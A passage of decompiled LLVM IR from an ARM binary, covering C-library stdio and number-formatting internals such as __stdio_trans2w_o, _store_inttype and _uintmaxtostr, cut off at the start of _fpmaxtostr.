  %v2_12ef8 = add i32 %v2_12ef4, %v1_12ef4
  %v2_12efc = sub i32 %v3_12ef0, %v2_12ef8
  %v1_12f00 = load i32, i32* @r6, align 4
  %v2_12f00 = sub i32 %v1_12f00, %v2_12ef8
  store i32 %v2_12f00, i32* @r6, align 4
  store i32 %v2_12efc, i32* %v2_12ef0, align 4
  br label %dec_label_pc_12f40

dec_label_pc_12f0c:                               ; preds = %dec_label_pc_12e6c
  %v2_12f0c = add i32 %tmp, 8
  %v3_12f0c = inttoptr i32 %v2_12f0c to i32*
  %v4_12f0c = load i32, i32* %v3_12f0c, align 4
  store i32 %v4_12f0c, i32* @r3, align 4
  %v9_12f10 = icmp eq i32 %v4_12e38, %v4_12f0c
  br i1 %v9_12f10, label %dec_label_pc_12f2c, label %dec_label_pc_12f18

dec_label_pc_12f18:                               ; preds = %dec_label_pc_12f0c
  store i32 %tmp, i32* @r0, align 4
  %v0_12f1c = call i32 @__stdio_wcommit()
  %v2_12f20 = icmp eq i32 %v0_12f1c, 0
  br i1 %v2_12f20, label %dec_label_pc_12f18.dec_label_pc_12f2c_crit_edge, label %bb15

dec_label_pc_12f18.dec_label_pc_12f2c_crit_edge:  ; preds = %dec_label_pc_12f18
  %v0_12f2c.pre = load i32, i32* @r6, align 4
  %v0_12f30.pre = load i32, i32* @r5, align 4
  %v0_12f34.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_12f2c

bb15:                                             ; preds = %dec_label_pc_12f18
  %v1_12f24 = load i32, i32* @r4, align 4
  store i32 %v1_12f24, i32* @r6, align 4
  br label %dec_label_pc_12f40

dec_label_pc_12f2c:                               ; preds = %dec_label_pc_12f18.dec_label_pc_12f2c_crit_edge, %entry, %dec_label_pc_12f0c
  %v0_12f34 = phi i32 [ %v0_12f34.pre, %dec_label_pc_12f18.dec_label_pc_12f2c_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_12f0c ]
  %v0_12f30 = phi i32 [ %v0_12f30.pre, %dec_label_pc_12f18.dec_label_pc_12f2c_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_12f0c ]
  %v0_12f2c = phi i32 [ %v0_12f2c.pre, %dec_label_pc_12f18.dec_label_pc_12f2c_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_12f0c ]
  %v1_12f30 = inttoptr i32 %v0_12f30 to i16*
  %v5_12f38 = call i32 @__stdio_WRITE(i16* %v1_12f30, i32 %v0_12f34, i32 %v0_12f2c)
  store i32 %v5_12f38, i32* @r6, align 4
  br label %dec_label_pc_12f40

dec_label_pc_12f40:                               ; preds = %bb15, %dec_label_pc_12ec4, %dec_label_pc_12eb4, %dec_label_pc_12e9c, %dec_label_pc_12e78, %dec_label_pc_12ef0, %bb12, %dec_label_pc_12f2c
  %v0_12f40 = load i32, i32* @r6, align 4
  %v2_12f48 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12f48, i32* @r4, align 4
  store i32 %v6_12e10, i32* @r5, align 4
  store i32 %v9_12e10, i32* @r6, align 4
  store i32 %v12_12e10, i32* @r7, align 4
  ret i32 %v0_12f40

; uselistorder directives
  uselistorder i32 %v2_12ef8, { 1, 0 }
  uselistorder i32 %v2_12ed0, { 1, 0 }
  uselistorder i32 %v1_12ec4.v0_12eb8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_12ec4, { 1, 0, 2 }
  uselistorder i32 %v2_12e44, { 2, 4, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_12f40, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_12f2c, { 0, 2, 1 }
  uselistorder label %bb12, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12f50 = load i32, i32* @r4, align 4
  store i32 %v3_12f50, i32* %stack_var_-8, align 4
  %v3_12f54 = load i16, i16* %arg1, align 2
  %v4_12f54 = zext i16 %v3_12f54 to i32
  %v2_12f58 = and i32 %v4_12f54, %arg2
  %v4_12f58 = icmp eq i32 %v2_12f58, 0
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_12f58, label %dec_label_pc_12f64, label %dec_label_pc_12f74

dec_label_pc_12f64:                               ; preds = %entry
  %v1_12f64 = and i32 %v4_12f54, 2176
  %v2_12f64 = icmp eq i32 %v1_12f64, 0
  br i1 %v2_12f64, label %dec_label_pc_12f6c, label %dec_label_pc_12f80

dec_label_pc_12f6c:                               ; preds = %dec_label_pc_12f64
  %v2_12f6c = or i32 %v4_12f54, %arg2
  %v1_12f70 = trunc i32 %v2_12f6c to i16
  store i16 %v1_12f70, i16* %arg1, align 2
  %v0_12f74.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12f74

dec_label_pc_12f74:                               ; preds = %entry, %dec_label_pc_12f6c
  %v0_12fb8 = phi i32 [ %tmp, %entry ], [ %v0_12f74.pre, %dec_label_pc_12f6c ]
  %v1_12f74 = inttoptr i32 %v0_12fb8 to i16*
  %v2_12f74 = load i16, i16* %v1_12f74, align 2
  %v3_12f74 = zext i16 %v2_12f74 to i32
  store i32 %v3_12f74, i32* @ip, align 4
  %v1_12f78 = and i32 %v3_12f74, 32
  %v2_12f78 = icmp eq i32 %v1_12f78, 0
  br i1 %v2_12f78, label %dec_label_pc_12fa8, label %dec_label_pc_12f80

dec_label_pc_12f80:                               ; preds = %dec_label_pc_12f64, %dec_label_pc_12f74
  %v0_12f84 = call i32 @__aeabi_read_tp()
  store i32 %v0_12f84, i32* %r0.global-to-local, align 4
  %v3_12f88 = load i16, i16* @global_var_24070.401, align 2
  %v4_12f88 = sext i16 %v3_12f88 to i32
  store i32 9, i32* %r2.global-to-local, align 4
  %v3_12f90 = add i32 %v4_12f88, %v0_12f84
  %v4_12f90 = inttoptr i32 %v3_12f90 to i32*
  store i32 9, i32* %v4_12f90, align 4
  br label %dec_label_pc_12f94

dec_label_pc_12f94:                               ; preds = %dec_label_pc_12fd0, %dec_label_pc_12f80
  %v0_12f94 = load i32, i32* @r4, align 4
  %v1_12f94 = inttoptr i32 %v0_12f94 to i16*
  %v2_12f94 = load i16, i16* %v1_12f94, align 2
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_12f9c = or i16 %v2_12f94, 8
  store i16 %v1_12f9c, i16* %v1_12f94, align 2
  br label %bb11

dec_label_pc_12fa8:                               ; preds = %dec_label_pc_12f74
  %tmp14 = urem i16 %v2_12f74, 4
  %v2_12fa8 = icmp eq i16 %tmp14, 0
  br i1 %v2_12fa8, label %dec_label_pc_13004, label %dec_label_pc_12fb0

dec_label_pc_12fb0:                               ; preds = %dec_label_pc_12fa8
  %v1_12fb0 = and i32 %v3_12f74, 4
  store i32 %v1_12fb0, i32* @r1, align 4
  %v2_12fb0 = icmp eq i32 %v1_12fb0, 0
  br i1 %v2_12fb0, label %dec_label_pc_12fb8, label %dec_label_pc_12fe8

dec_label_pc_12fb8:                               ; preds = %dec_label_pc_12fb0
  %v1_12fb8 = add i32 %v0_12fb8, 20
  %v2_12fb8 = inttoptr i32 %v1_12fb8 to i32*
  %v3_12fb8 = load i32, i32* %v2_12fb8, align 4
  store i32 %v3_12fb8, i32* %r2.global-to-local, align 4
  %v1_12fbc = add i32 %v0_12fb8, 16
  %v2_12fbc = inttoptr i32 %v1_12fbc to i32*
  %v3_12fbc = load i32, i32* %v2_12fbc, align 4
  %v9_12fc0 = icmp eq i32 %v3_12fb8, %v3_12fbc
  br i1 %v9_12fc0, label %dec_label_pc_12fc8, label %dec_label_pc_12fd0

dec_label_pc_12fc8:                               ; preds = %dec_label_pc_12fb8
  %v1_12fc8 = and i32 %v3_12f74, 2
  %v2_12fc8 = icmp eq i32 %v1_12fc8, 0
  br i1 %v2_12fc8, label %dec_label_pc_12fe8, label %dec_label_pc_12fd0

dec_label_pc_12fd0:                               ; preds = %dec_label_pc_12fb8, %dec_label_pc_12fc8
  %v1_12fd0 = and i32 %v3_12f74, 1024
  %tmp12 = udiv i32 %v1_12fd0, 1024
  %tmp13 = add nuw nsw i32 %tmp12, 1
  store i32 %tmp13, i32* %r2.global-to-local, align 4
  %v0_12fdc = call i32 @__GI_fseek()
  store i32 %v0_12fdc, i32* %r0.global-to-local, align 4
  %v2_12fe0 = icmp eq i32 %v0_12fdc, 0
  br i1 %v2_12fe0, label %.dec_label_pc_12fe8_crit_edge, label %dec_label_pc_12f94

.dec_label_pc_12fe8_crit_edge:                    ; preds = %dec_label_pc_12fd0
  %v0_12fe8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12fe8

dec_label_pc_12fe8:                               ; preds = %.dec_label_pc_12fe8_crit_edge, %dec_label_pc_12fb0, %dec_label_pc_12fc8
  %v2_12ff4 = phi i32 [ %v0_12fe8.pre, %.dec_label_pc_12fe8_crit_edge ], [ %v0_12fb8, %dec_label_pc_12fb0 ], [ %v0_12fb8, %dec_label_pc_12fc8 ]
  %v1_12fe8 = inttoptr i32 %v2_12ff4 to i16*
  %v2_12fe8 = load i16, i16* %v1_12fe8, align 2
  %v1_12fec = add i32 %v2_12ff4, 8
  %v2_12fec = inttoptr i32 %v1_12fec to i32*
  %v3_12fec = load i32, i32* %v2_12fec, align 4
  store i32 %v3_12fec, i32* %r2.global-to-local, align 4
  %v1_12ff0 = and i16 %v2_12fe8, -4
  store i16 %v1_12ff0, i16* %v1_12fe8, align 2
  %v0_12ff8 = load i32, i32* %r2.global-to-local, align 4
  %v1_12ff8 = load i32, i32* @r4, align 4
  %v2_12ff8 = add i32 %v1_12ff8, 20
  %v3_12ff8 = inttoptr i32 %v2_12ff8 to i32*
  store i32 %v0_12ff8, i32* %v3_12ff8, align 4
  %v0_12ffc = load i32, i32* %r2.global-to-local, align 4
  %v1_12ffc = load i32, i32* @r4, align 4
  %v2_12ffc = add i32 %v1_12ffc, 24
  %v3_12ffc = inttoptr i32 %v2_12ffc to i32*
  store i32 %v0_12ffc, i32* %v3_12ffc, align 4
  %v0_13000 = load i32, i32* %r2.global-to-local, align 4
  %v1_13000 = load i32, i32* @r4, align 4
  %v2_13000 = add i32 %v1_13000, 16
  %v3_13000 = inttoptr i32 %v2_13000 to i32*
  store i32 %v0_13000, i32* %v3_13000, align 4
  %v0_13004.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13004

dec_label_pc_13004:                               ; preds = %dec_label_pc_12fa8, %dec_label_pc_12fe8
  %v2_13010 = phi i32 [ %v0_12fb8, %dec_label_pc_12fa8 ], [ %v0_13004.pre, %dec_label_pc_12fe8 ]
  %v1_13004 = inttoptr i32 %v2_13010 to i16*
  %v2_13004 = load i16, i16* %v1_13004, align 2
  %v3_13004 = zext i16 %v2_13004 to i32
  %v1_13008 = or i16 %v2_13004, 64
  %v1_1300c = and i32 %v3_13004, 2816
  store i32 %v1_1300c, i32* %r0.global-to-local, align 4
  %v2_1300c = icmp eq i32 %v1_1300c, 0
  store i16 %v1_13008, i16* %v1_13004, align 2
  br i1 %v2_1300c, label %bb10, label %.thread1

bb10:                                             ; preds = %dec_label_pc_13004
  %v1_13014 = load i32, i32* @r4, align 4
  %v2_13014 = add i32 %v1_13014, 12
  %v3_13014 = inttoptr i32 %v2_13014 to i32*
  %v4_13014 = load i32, i32* %v3_13014, align 4
  %v3_13018 = add i32 %v1_13014, 28
  %v4_13018 = inttoptr i32 %v3_13018 to i32*
  store i32 %v4_13014, i32* %v4_13018, align 4
  br label %bb11

.thread1:                                         ; preds = %dec_label_pc_13004
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb11

bb11:                                             ; preds = %bb10, %dec_label_pc_12f94, %.thread1
  %v2_13020 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13020, i32* @r4, align 4
  %v1_13024 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_13024

; uselistorder directives
  uselistorder i32 %v2_12ff4, { 1, 0 }
  uselistorder i32 %v0_12fb8, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_12f54, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 4, 3, 5 }
  uselistorder label %bb11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13004, { 1, 0 }
  uselistorder label %dec_label_pc_12fe8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_12fd0, { 1, 0 }
  uselistorder label %dec_label_pc_12f80, { 1, 0 }
  uselistorder label %dec_label_pc_12f74, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_1302c = load i32, i32* @r2, align 4
  %v1_1302c = icmp slt i32 %v0_1302c, 0
  %v0_13030 = load i32, i32* @r0, align 4
  %v1_13034 = and i32 %v0_13030, 2048
  %v2_13068 = icmp eq i32 %v1_13034, 0
  br i1 %v1_1302c, label %dec_label_pc_13068, label %dec_label_pc_1303c

dec_label_pc_1303c:                               ; preds = %entry
  br i1 %v2_13068, label %dec_label_pc_13044, label %dec_label_pc_13070

dec_label_pc_13044:                               ; preds = %dec_label_pc_1303c
  %v7_13044 = icmp eq i32 %v0_13030, 256
  %v0_13048 = load i32, i32* @r1, align 4
  %v1_13048 = inttoptr i32 %v0_13048 to i32*
  %v2_13048 = load i32, i32* %v1_13048, align 4
  %v2_1304c = urem i32 %v2_13048, 256
  %v2_1304c.v2_13048 = select i1 %v7_13044, i32 %v2_1304c, i32 %v2_13048
  br i1 %v7_13044, label %.thread, label %dec_label_pc_13054

dec_label_pc_13054:                               ; preds = %dec_label_pc_13044
  %v7_13054 = icmp eq i32 %v0_13030, 512
  br i1 %v7_13054, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13054
  %v4_1305c = urem i32 %v2_1304c.v2_13048, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13054, %dec_label_pc_13044, %bb
  %v1_13064 = phi i32 [ %v2_13048, %dec_label_pc_13054 ], [ %v2_1304c, %dec_label_pc_13044 ], [ %v4_1305c, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_13064

dec_label_pc_13068:                               ; preds = %entry
  br i1 %v2_13068, label %dec_label_pc_13078, label %dec_label_pc_13070

dec_label_pc_13070:                               ; preds = %dec_label_pc_1303c, %dec_label_pc_13068
  %v0_13070 = load i32, i32* @r1, align 4
  %v1_13070 = inttoptr i32 %v0_13070 to i32*
  %v2_13070 = load i32, i32* %v1_13070, align 4
  %v3_13070 = add i32 %v0_13070, 4
  %v4_13070 = inttoptr i32 %v3_13070 to i32*
  %v5_13070 = load i32, i32* %v4_13070, align 4
  store i32 %v5_13070, i32* @r1, align 4
  ret i32 %v2_13070

dec_label_pc_13078:                               ; preds = %dec_label_pc_13068
  %v7_13078 = icmp eq i32 %v0_13030, 256
  %v0_1307c = load i32, i32* @r1, align 4
  %v1_1307c = inttoptr i32 %v0_1307c to i32*
  %v2_1307c = load i32, i32* %v1_1307c, align 4
  br i1 %v7_13078, label %.thread1, label %dec_label_pc_1308c

.thread1:                                         ; preds = %dec_label_pc_13078
  %v4_13080 = mul i32 %v2_1307c, 16777216
  %v4_13084 = sdiv i32 %v4_13080, 16777216
  br label %.thread3

dec_label_pc_1308c:                               ; preds = %dec_label_pc_13078
  %v7_1308c = icmp eq i32 %v0_13030, 512
  br i1 %v7_1308c, label %bb9, label %.thread3

bb9:                                              ; preds = %dec_label_pc_1308c
  %v4_13090 = mul i32 %v2_1307c, 65536
  %v4_13094 = sdiv i32 %v4_13090, 65536
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %dec_label_pc_1308c, %bb9
  %v0_13098 = phi i32 [ %v2_1307c, %dec_label_pc_1308c ], [ %v4_13084, %.thread1 ], [ %v4_13094, %bb9 ]
  %v3_13098 = ashr i32 %v0_13098, 31
  store i32 %v3_13098, i32* @r1, align 4
  ret i32 %v0_13098

; uselistorder directives
  uselistorder i32 %v0_13098, { 1, 0 }
  uselistorder i32 %v2_1307c, { 2, 0, 1 }
  uselistorder i32 %v2_1304c, { 1, 0 }
  uselistorder i32 %v2_13048, { 1, 2, 0 }
  uselistorder i1 %v2_13068, { 1, 0 }
  uselistorder label %.thread3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13070, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = trunc i32 %arg3 to i16
  store i32 %arg2, i32* @r1, align 4
  %tmp2 = ptrtoint i16* %arg1 to i32
  %v7_130a0 = icmp eq i32 %arg2, 256
  store i1 %v7_130a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_130a0, label %bb, label %bb4

bb:                                               ; preds = %entry
  %v3_130a4 = trunc i32 %arg3 to i8
  %tmp3 = bitcast i16* %arg1 to i8*
  store i8 %v3_130a4, i8* %tmp3, align 1
  %v1_130a8.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v1_130a8 = phi i1 [ false, %entry ], [ %v1_130a8.pre, %bb ]
  %v0_130a8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_130a8, i32 %v0_130a8)
  %v7_130ac = icmp eq i32 %arg2, 2048
  store i1 %v7_130ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_130ac, label %dec_label_pc_130b4, label %dec_label_pc_130bc

dec_label_pc_130b4:                               ; preds = %bb4
  %tmp5 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp5, align 4
  %v5_130b4 = add i32 %tmp2, 4
  %v6_130b4 = inttoptr i32 %v5_130b4 to i32*
  store i32 %arg4, i32* %v6_130b4, align 4
  ret i32 %tmp2

dec_label_pc_130bc:                               ; preds = %bb4
  %v7_130bc = icmp eq i32 %arg2, 512
  store i1 %v7_130bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_130bc, label %bb6, label %.thread

bb6:                                              ; preds = %dec_label_pc_130bc
  store i16 %tmp, i16* %arg1, align 2
  br label %bb8

.thread:                                          ; preds = %dec_label_pc_130bc
  %tmp7 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp7, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %.thread
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder i16* %arg1, { 2, 3, 0, 1, 4 }
  uselistorder label %bb8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp21 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp21, i32* %r7.global-to-local, align 4
  %v1_130d8 = icmp slt i32 %tmp21, 0
  %v2_130d8 = icmp eq i32 %tmp21, 0
  store i1 %v2_130d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v0_130e0 = load i32, i32* @r2, align 4
  store i32 %v0_130e0, i32* %r5.global-to-local, align 4
  %v0_130e4 = load i32, i32* @r3, align 4
  store i32 %v0_130e4, i32* %r6.global-to-local, align 4
  br i1 %v1_130d8, label %dec_label_pc_130ec, label %dec_label_pc_1310c

dec_label_pc_130ec:                               ; preds = %entry
  %v1_130ec = icmp slt i32 %v0_130e4, 0
  %v2_130ec = icmp eq i32 %v0_130e4, 0
  store i1 %v2_130ec, i1* %cpsr_z.global-to-local, align 1
  %v1_130f0 = sub i32 0, %tmp21
  store i32 %v1_130f0, i32* %r7.global-to-local, align 4
  br i1 %v1_130ec, label %dec_label_pc_130f8, label %dec_label_pc_1310c

dec_label_pc_130f8:                               ; preds = %dec_label_pc_130ec
  %v1_130fc = sub i32 0, %v0_130e0
  store i32 %v1_130fc, i32* %r5.global-to-local, align 4
  %v2_130fc = icmp eq i32 %v0_130e0, 0
  %v2_13100 = icmp eq i1 %v2_130fc, false
  %v5_13100 = sext i1 %v2_13100 to i32
  %v6_13100 = sub i32 %v5_13100, %v0_130e4
  store i32 %v6_13100, i32* %r6.global-to-local, align 4
  %v19_13100 = icmp eq i32 %v6_13100, 0
  store i1 %v19_13100, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13114

dec_label_pc_1310c:                               ; preds = %dec_label_pc_130ec, %entry
  br label %dec_label_pc_13114

dec_label_pc_13114:                               ; preds = %dec_label_pc_130f8, %dec_label_pc_1310c
  %storemerge = phi i8 [ 0, %dec_label_pc_1310c ], [ 1, %dec_label_pc_130f8 ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_1311c = load i32, i32* %r7.global-to-local, align 4
  %v2_13124 = udiv i32 -1, %v0_1311c
  store i32 %v2_13124, i32* %fp.global-to-local, align 4
  %v3_13134 = urem i32 -1, %v0_1311c
  %v1_13138 = add i32 %v3_13134, 1
  store i32 %v1_13138, i32* %sb.global-to-local, align 4
  %v9_1313c = icmp eq i32 %v1_13138, %v0_1311c
  store i1 %v9_1313c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1313c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13114
  %v1_13140 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_13140, i32* %sb.global-to-local, align 4
  %v2_13144 = add i32 %v2_13124, 1
  store i32 %v2_13144, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13114, %bb
  %v0_13148 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_13148, i32* %sl.global-to-local, align 4
  %v0_1314c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1314c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13150

dec_label_pc_13150thread-pre-split:               ; preds = %bb25
  %v0_13150.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_13154.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_13158.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13150

dec_label_pc_13150:                               ; preds = %dec_label_pc_13150thread-pre-split, %.thread
  %v0_131d4 = phi i32 [ %v0_13158.pre, %dec_label_pc_13150thread-pre-split ], [ %v0_1311c, %.thread ]
  %v0_131cc = phi i32 [ %v0_13154.pre, %dec_label_pc_13150thread-pre-split ], [ %v0_1314c, %.thread ]
  %v0_13168 = phi i32 [ %v0_13150.pr, %dec_label_pc_13150thread-pre-split ], [ %v0_13148, %.thread ]
  %v2_13150 = icmp eq i32 %v0_13168, 0
  store i1 %v2_13150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13150, label %dec_label_pc_131c8, label %dec_label_pc_13160

dec_label_pc_13160:                               ; preds = %dec_label_pc_13150
  %v2_13164 = udiv i32 %v0_13168, %v0_131d4
  %v3_13164 = urem i32 %v0_13168, %v0_131d4
  store i32 %v2_13164, i32* %sl.global-to-local, align 4
  %v2_13184 = udiv i32 %v0_131cc, %v0_131d4
  %v3_13184 = urem i32 %v0_131cc, %v0_131d4
  %v0_13188 = load i32, i32* %sb.global-to-local, align 4
  %v2_13188 = mul i32 %v0_13188, %v3_13164
  %v2_13190 = add i32 %v2_13188, %v3_13184
  store i32 %v2_13190, i32* %r5.global-to-local, align 4
  %v0_1319c = load i32, i32* %fp.global-to-local, align 4
  %v2_1319c = mul i32 %v0_1319c, %v3_13164
  %v2_131a4 = add i32 %v2_1319c, %v2_13184
  %v2_131ac = udiv i32 %v2_13190, %v0_131d4
  %v2_131b4 = add i32 %v2_131a4, %v2_131ac
  br label %dec_label_pc_131e0

dec_label_pc_131c8:                               ; preds = %dec_label_pc_13150
  %v2_131c8 = udiv i32 %v0_131cc, %v0_131d4
  br label %dec_label_pc_131e0

dec_label_pc_131e0:                               ; preds = %dec_label_pc_13160, %dec_label_pc_131c8
  %storemerge28 = phi i32 [ %v2_131c8, %dec_label_pc_131c8 ], [ %v2_131b4, %dec_label_pc_13160 ]
  %v0_131fc = phi i32 [ %v2_131c8, %dec_label_pc_131c8 ], [ %v2_131b4, %dec_label_pc_13160 ]
  %v1_131fc = phi i32 [ 0, %dec_label_pc_131c8 ], [ %v2_13164, %dec_label_pc_13160 ]
  %v2_13190.pn = phi i32 [ %v0_131cc, %dec_label_pc_131c8 ], [ %v2_13190, %dec_label_pc_13160 ]
  store i32 %storemerge28, i32* %r6.global-to-local, align 4
  %v0_131e8 = urem i32 %v2_13190.pn, %v0_131d4
  %v2_131e4 = icmp ugt i32 %v0_131e8, 8
  %v7_131e4 = icmp eq i32 %v0_131e8, 9
  store i1 %v7_131e4, i1* %cpsr_z.global-to-local, align 1
  %v1_131ec = add i32 %v0_131e8, 48
  %v0_131f4 = load i32, i32* %r8.global-to-local, align 4
  %v1_131f4 = add i32 %v0_131f4, -1
  store i32 %v1_131f4, i32* %r8.global-to-local, align 4
  %v2_131f8 = xor i1 %v7_131e4, true
  %v3_131f8 = and i1 %v2_131e4, %v2_131f8
  %extract.t = trunc i32 %v1_131ec to i8
  br i1 %v3_131f8, label %bb24, label %bb25

bb24:                                             ; preds = %dec_label_pc_131e0
  %v2_131e8 = add i32 %v0_131e8, %tmp11
  %extract.t9 = trunc i32 %v2_131e8 to i8
  br label %bb25

bb25:                                             ; preds = %dec_label_pc_131e0, %bb24
  %v0_13200.off0 = phi i8 [ %extract.t, %dec_label_pc_131e0 ], [ %extract.t9, %bb24 ]
  %v2_131fc = or i32 %v0_131fc, %v1_131fc
  %v4_131fc = icmp eq i32 %v2_131fc, 0
  store i1 %v4_131fc, i1* %cpsr_z.global-to-local, align 1
  %v3_13200 = inttoptr i32 %v1_131f4 to i8*
  store i8 %v0_13200.off0, i8* %v3_13200, align 1
  %v0_13204 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13204, label %dec_label_pc_13208, label %dec_label_pc_13150thread-pre-split

dec_label_pc_13208:                               ; preds = %bb25
  %v4_1320810 = zext i8 %storemerge to i32
  store i32 %v4_1320810, i32* @r3, align 4
  %v2_1320c = icmp eq i8 %storemerge, 0
  store i1 %v2_1320c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1320c, label %dec_label_pc_13208..thread2_crit_edge, label %bb26

dec_label_pc_13208..thread2_crit_edge:            ; preds = %dec_label_pc_13208
  %v0_13218.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb26:                                             ; preds = %dec_label_pc_13208
  store i32 45, i32* @r3, align 4
  %v3_13214 = load i32, i32* %r8.global-to-local, align 4
  %v4_13214 = add i32 %v3_13214, -1
  %v5_13214 = inttoptr i32 %v4_13214 to i8*
  store i8 45, i8* %v5_13214, align 1
  %v6_13214 = load i32, i32* %r8.global-to-local, align 4
  %v7_13214 = add i32 %v6_13214, -1
  store i32 %v7_13214, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13208..thread2_crit_edge, %bb26
  %v0_13218 = phi i32 [ %v0_13218.pre, %dec_label_pc_13208..thread2_crit_edge ], [ %v7_13214, %bb26 ]
  ret i32 %v0_13218

; uselistorder directives
  uselistorder i32 %v0_131e8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_131d4, { 0, 6, 1, 2, 3, 5, 4 }
  uselistorder i8 %storemerge, { 1, 0 }
  uselistorder i32 %v0_130e0, { 1, 0, 2 }
  uselistorder i32 %tmp21, { 0, 3, 2, 1 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %dec_label_pc_131e0, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_13114, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, double %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
